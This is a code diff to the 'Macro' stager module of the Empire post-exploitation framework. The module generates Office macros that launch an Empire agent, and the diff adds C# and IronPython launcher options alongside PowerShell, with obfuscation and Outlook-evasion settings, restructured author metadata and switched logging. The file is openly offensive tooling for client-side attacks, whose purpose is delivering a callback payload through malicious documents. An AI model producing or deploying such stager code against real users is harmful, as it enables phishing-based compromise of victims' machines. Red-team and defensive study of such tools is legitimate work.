@@ -1,10 +1,13 @@
 from __future__ import print_function
 
+import logging
 import random
 import string
 from builtins import object, range, str
 
 from empire.server.common import helpers
+
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
@@ -12,17 +15,25 @@ class Stager(object):
 
         self.info = {
             "Name": "Macro",
-            "Author": ["@enigma0x3", "@harmj0y"],
+            "Authors": [
+                {
+                    "Name": "Will Schroeder",
+                    "Handle": "@harmj0y",
+                    "Link": "https://twitter.com/harmj0y",
+                },
+                {
+                    "Name": "",
+                    "Handle": "@enigma0x3",
+                    "Link": "",
+                },
+            ],
             "Description": "Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.",
             "Comments": [
                 "http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/"
             ],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -32,7 +43,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
             "StagerRetries": {
@@ -100,12 +111,9 @@ class Stager(object):
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
@@ -138,20 +146,39 @@ class Stager(object):
         if outlook_evasion.lower() == "true":
             outlook_evasion_bool = True
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listenerName=listener_name,
-            language=language,
-            encode=encode,
-            obfuscate=invoke_obfuscation,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-            safeChecks=safe_checks,
-            bypasses=bypasses,
-        )
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=invoke_obfuscation,
+                obfuscation_command=obfuscate_command,
+                encode=encode,
+                listener_name=listener_name,
+            )
+        elif language == "powershell":
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language=language,
+                encode=encode,
+                obfuscate=invoke_obfuscation,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+                safeChecks=safe_checks,
+                bypasses=bypasses,
+            )
 
         set_string = "".join(
             random.choice(string.ascii_letters)
@@ -163,7 +190,7 @@ class Stager(object):
         )
 
         if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("[!] Error in launcher command generation.")
             return ""
         else:
             chunks = list(helpers.chunks(launcher, 50))
